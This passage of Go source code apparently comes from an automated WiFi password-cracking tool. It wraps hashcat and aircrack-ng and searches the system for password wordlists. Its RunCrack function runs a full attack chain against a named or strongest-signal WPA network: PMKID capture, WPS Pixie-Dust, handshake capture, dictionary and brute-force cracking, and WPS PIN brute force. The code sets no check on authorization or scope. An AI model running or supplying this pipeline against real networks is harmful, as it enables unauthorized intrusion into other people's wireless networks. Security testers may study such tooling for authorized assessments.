			result.Details = fmt.Sprintf("Hashcat exited with code %d. %s", exitCode, tail)
		}
	}

	result.CaptureFile = hashFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// parseHashcatOutput parses hashcat stdout for cracked password.
//
// Hashcat prints cracked hashes as: <hash>:<password>
// For WPA mode 22000, the hash line is long, password is after the last colon.
func parseHashcatOutput(stdout string) string {
	for _, line := range strings.Split(stdout, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, "Session") {
			continue
		}
		if strings.Contains(line, ":") && (strings.Contains(line, "WPA") || strings.Count(line, ":") > 3) {
			parts := strings.SplitN(line, ":", -1)
			password := parts[len(parts)-1]
			if password != "" && password != line {
				return password
			}
		}
	}
	return ""
}

// findHashcatRules finds a hashcat rules file for rule-based attacks.
func findHashcatRules(hashcatPath string) string {
	hashcatDir := filepath.Dir(hashcatPath)
	candidates := []string{
		filepath.Join(hashcatDir, "rules", "best64.rule"),
		filepath.Join(hashcatDir, "..", "share", "hashcat", "rules", "best64.rule"),
		"/usr/share/hashcat/rules/best64.rule",
		"/opt/homebrew/share/hashcat/rules/best64.rule",
		"/usr/local/share/hashcat/rules/best64.rule",
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return "best64.rule"
}

// ---------------------------------------------------------------------------
// Aircrack-ng cracking (CPU fallback)
// ---------------------------------------------------------------------------

// CrackWithAircrack cracks a captured handshake with aircrack-ng (CPU-only).
//
// This is a fallback when hashcat is not available. aircrack-ng is CPU-only
// and significantly slower, but works on any system without GPU requirements.
func CrackWithAircrack(captureFile, wordlist string) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Dictionary, Success: false}

	if _, err := os.Stat(captureFile); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Capture file not found: %s", captureFile)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	aircrackPath, err := findAircrack()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if wordlist == "" {
		wordlists := FindWordlists()
		if len(wordlists) == 0 {
			result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
			result.Elapsed = time.Since(start)
			return result, nil
		}
		wordlist = wordlists[0]
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Wordlist not found: %s", wordlist)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.Command(aircrackPath, "-w", wordlist, "-q", captureFile)
	out, _ := cmd.CombinedOutput()
	stdoutText := string(out)

	// Parse aircrack-ng output for "KEY FOUND! [ password ]".
	keyRE := regexp.MustCompile(`KEY FOUND!\s*\[\s*(.+?)\s*\]`)
	if m := keyRE.FindStringSubmatch(stdoutText); len(m) > 1 {
		result.Success = true
		result.Password = m[1]
		result.Details = fmt.Sprintf("Password cracked: %s", result.Password)
	} else {
		result.Details = "Password not found in wordlist"
	}

	result.CaptureFile = captureFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// Wordlist discovery
// ---------------------------------------------------------------------------

// FindWordlists finds available wordlists on the system.
// Returns paths sorted by preference (rockyou first).
func FindWordlists() []string {
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/tmp"
	}

	commonPaths := []string{
		"/usr/share/wordlists/rockyou.txt",
		"/usr/share/wordlists/rockyou.txt.gz",
		"/opt/homebrew/share/wordlists/rockyou.txt",
		filepath.Join(home, ".nowifi", "wordlists", "rockyou.txt"),
		filepath.Join(home, "wordlists", "rockyou.txt"),
		"/usr/share/wordlists/darkc0de.txt",
		"/usr/share/wordlists/wifite.txt",
		"/usr/share/john/password.lst",
		"/usr/share/wordlists/fasttrack.txt",
		"/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
		"/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
	}

	// Also scan ~/.nowifi/wordlists/ directory for .txt files.
	nowifiWLDir := filepath.Join(home, ".nowifi", "wordlists")
	if entries, err := os.ReadDir(nowifiWLDir); err == nil {
		knownSet := make(map[string]bool, len(commonPaths))
		for _, p := range commonPaths {
			knownSet[p] = true
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			ext := filepath.Ext(e.Name())
			if ext == ".txt" || ext == ".lst" {
				full := filepath.Join(nowifiWLDir, e.Name())
				if !knownSet[full] {
					commonPaths = append(commonPaths, full)
				}
			}
		}
	}

	var found []string
	for _, p := range commonPaths {
		if info, err := os.Stat(p); err == nil && info.Size() > 0 {
			found = append(found, p)
		}
	}

	return found
}

// ---------------------------------------------------------------------------
// Full cracking pipeline
// ---------------------------------------------------------------------------

// RunCrack runs the full cracking pipeline against a target.
//
// Pipeline (ordered by speed and effectiveness):
//  1. PMKID capture       -- client-less, ~60% of APs vulnerable
//  2. WPS Pixie-Dust      -- fast (5-30s), ~30% of WPS-enabled APs
//  3. Hashcat crack PMKID -- GPU-accelerated dictionary/brute
//  4. Handshake capture   -- needs connected clients
//  5. Hashcat crack handshake
//  6. WPS PIN brute force -- slow (2-10h), last resort
//  7. Aircrack-ng         -- CPU fallback if hashcat unavailable
func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Result, error) {
	var results []Result

	// Step 1: Scan for targets.
	scanDuration := 10
	targets, err := ScanTargets(iface, scanDuration)
	if err != nil || len(targets) == 0 {
		results = append(results, Result{
			Method:  PMKID,
			Success: false,
			Details: "No WiFi networks found. Check interface and WiFi connection.",
		})
		return results, nil
	}

	// Step 2: Select target.
	var target *WifiTarget
	if targetSSID != "" {
		for i := range targets {
			if strings.EqualFold(targets[i].SSID, targetSSID) {
				target = &targets[i]
				break
			}
		}
		if target == nil {
			ssids := make([]string, 0, 10)
			for i := 0; i < len(targets) && i < 10; i++ {
				ssids = append(ssids, targets[i].SSID)
			}
			results = append(results, Result{
				Method:  PMKID,
				Success: false,
				Details: fmt.Sprintf("Target SSID '%s' not found. Visible networks: %s", targetSSID, strings.Join(ssids, ", ")),
			})
			return results, nil
		}
	} else {
		// Pick WPA/WPA2 target with strongest signal.
		for i := range targets {
			sec := strings.ToLower(targets[i].Security)
			if strings.Contains(sec, "wpa") || strings.Contains(sec, "wpa2") {
				target = &targets[i]
				break
			}
		}
		if target == nil {
			target = &targets[0]
		}
	}

	// Enrich target with WPS info if not already set.
	if !target.WPSEnabled {
		wpsTargets := ScanWPSTargets(iface, 10*time.Second)
		for _, wt := range wpsTargets {
			if strings.EqualFold(wt.BSSID, target.BSSID) {
				target.WPSEnabled = wt.WPSEnabled
				target.WPSLocked = wt.WPSLocked
				target.WPSVersion = wt.WPSVersion
				break
			}
		}
	}

	// Step 3: Try PMKID capture (client-less, most effective).
	pmkidResult, _ := CapturePMKID(*target, iface, timeout)
	if pmkidResult != nil {
		results = append(results, *pmkidResult)
	}

	// Step 4: WPS Pixie-Dust (fast, try before slow hashcat).
	if target.WPSEnabled && !target.WPSLocked {
		pixieTimeout := timeout
		if pixieTimeout > 5*time.Minute {
			pixieTimeout = 5 * time.Minute
		}
		pixieResult, _ := CrackWPSPixie(*target, iface, pixieTimeout)
		if pixieResult != nil {
			results = append(results, *pixieResult)
			if pixieResult.Success && pixieResult.Password != "" {
				return results, nil
			}
		}
	}

	// Step 5: Crack PMKID with hashcat (if captured).
	if pmkidResult != nil && pmkidResult.Success && pmkidResult.CaptureFile != "" {
		crackResult, _ := CrackWithHashcat(pmkidResult.CaptureFile, wordlist)
		if crackResult != nil {
			results = append(results, *crackResult)
			if crackResult.Success {
				return results, nil
			}
		}

		// Try brute force (8-digit numeric, common ISP defaults).
		bruteResult, _ := crackWithHashcatMode(pmkidResult.CaptureFile, "brute", "")
		if bruteResult != nil {
			results = append(results, *bruteResult)
			if bruteResult.Success {
				return results, nil
			}
		}

		// Aircrack-ng as fallback.
		aircrackResult, _ := CrackWithAircrack(pmkidResult.CaptureFile, wordlist)
		if aircrackResult != nil {
			results = append(results, *aircrackResult)
			if aircrackResult.Success {
				return results, nil
			}
		}
	}

	// Step 6: Try handshake capture (needs clients).
	hsResult, _ := CaptureHandshake(*target, iface, timeout)
	if hsResult != nil {
		results = append(results, *hsResult)

		if hsResult.Success && hsResult.CaptureFile != "" {
			// Step 7: Crack handshake with hashcat.
			crackResult, _ := CrackWithHashcat(hsResult.CaptureFile, wordlist)
			if crackResult != nil {
				results = append(results, *crackResult)
				if crackResult.Success {
					return results, nil
				}
			}

			// Try brute force.
			bruteResult, _ := crackWithHashcatMode(hsResult.CaptureFile, "brute", "")
			if bruteResult != nil {
				results = append(results, *bruteResult)
				if bruteResult.Success {
					return results, nil
				}
			}

			// Aircrack-ng fallback.
			aircrackResult, _ := CrackWithAircrack(hsResult.CaptureFile, wordlist)
			if aircrackResult != nil {
				results = append(results, *aircrackResult)
				if aircrackResult.Success {
					return results, nil
				}
			}
		}
	}

	// Step 8: WPS PIN brute force (slow, last resort -- 2-10 hours).
	if target.WPSEnabled && !target.WPSLocked {
		pinTimeout := timeout * 4
		if pinTimeout > time.Hour {
			pinTimeout = time.Hour
		}
		pinResult, _ := CrackWPSPin(*target, iface, pinTimeout)
		if pinResult != nil {
			results = append(results, *pinResult)
		}
	}

	return results, nil
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// runWithTimeout runs a command with a timeout and returns its stdout.
func runWithTimeout(binary string, args []string, timeout time.Duration) string {
	cmd := exec.Command(binary, args...)
	return runCmdWithTimeout(cmd, timeout)
}

// runCmdWithTimeout starts a command and waits up to timeout, returning stdout.
func runCmdWithTimeout(cmd *exec.Cmd, timeout time.Duration) string {
	if cmd.Stdout != nil {
		// Already configured; don't override.
		_ = cmd.Run()
		return ""
	}

	out, err := runCmdBytes(cmd, timeout)
	if err != nil {
		return string(out)
	}
	return string(out)
}

// runCmdBytes starts a command, waits for it with a timeout, and returns combined output.
func runCmdBytes(cmd *exec.Cmd, timeout time.Duration) ([]byte, error) {
	var buf strings.Builder
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return nil, err
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		return []byte(buf.String()), err
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
		return []byte(buf.String()), fmt.Errorf("command timed out after %v", timeout)
	}
}

// countFileLines counts non-empty lines in a file.
func countFileLines(path string) int {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	count := 0
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) != "" {
			count++
		}
	}
	return count
}
